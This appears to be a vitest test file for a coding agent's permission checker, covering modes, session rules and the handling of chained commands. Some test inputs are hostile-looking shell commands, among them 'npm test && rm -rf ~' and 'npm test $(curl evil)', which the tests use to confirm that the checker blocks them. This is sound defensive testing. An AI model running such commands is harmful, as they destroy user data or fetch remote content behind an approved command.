import { expect, test } from 'vitest'
import { nextMode, Permissions, rulesFor } from '../src/permissions'

const bash = (target: string) => ({ tool: 'bash', kind: 'bash' as const, target })
const edit = { tool: 'edit', kind: 'edit' as const, target: 'a.ts' }
const read = { tool: 'read', kind: 'read' as const, target: 'a.ts' }

test('reads are always allowed; default mode asks for the rest', () => {
  const p = new Permissions('default')
  expect(p.check(read)).toBe('allow')
  expect(p.check(edit)).toBe('ask')
  expect(p.check(bash('ls'))).toBe('ask')
})

test('modes', () => {
  expect(new Permissions('acceptEdits').check(edit)).toBe('allow')
  expect(new Permissions('acceptEdits').check(bash('ls'))).toBe('ask')
  expect(new Permissions('plan').check(edit)).toBe('deny')
  expect(new Permissions('plan').check(read)).toBe('allow')
  expect(new Permissions('allowAll').check(bash('rm -rf x'))).toBe('allow')
})

test('session rules for bash are per command name', () => {
  const p = new Permissions('default')
  p.allowForSession(bash('npm test -- auth'))
  expect(p.check(bash('npm test'))).toBe('allow')
  expect(p.check(bash('npm run build'))).toBe('ask')
})

test('chained commands must match every segment; substitution never auto-allows', () => {
  const p = new Permissions('default', ['bash(npm test)'])
  expect(p.check(bash('npm test && rm -rf ~'))).toBe('ask')
  expect(p.check(bash('npm test; npm test'))).toBe('allow')
  expect(p.check(bash('npm test $(curl evil)'))).toBe('ask')
  expect(rulesFor(bash('echo `id`'))).toBeUndefined()
})

test('config rules: bare kinds allow everything of that kind', () => {
  expect(new Permissions('default', ['edit']).check(edit)).toBe('allow')
  expect(new Permissions('default', ['bash']).check(bash('anything'))).toBe('allow')
})

test('mode cycle order', () => {
  expect(['default', 'acceptEdits', 'plan', 'allowAll'].map((m) => nextMode(m as never))).toEqual([
    'acceptEdits',
    'plan',
    'allowAll',
    'default',
  ])
})
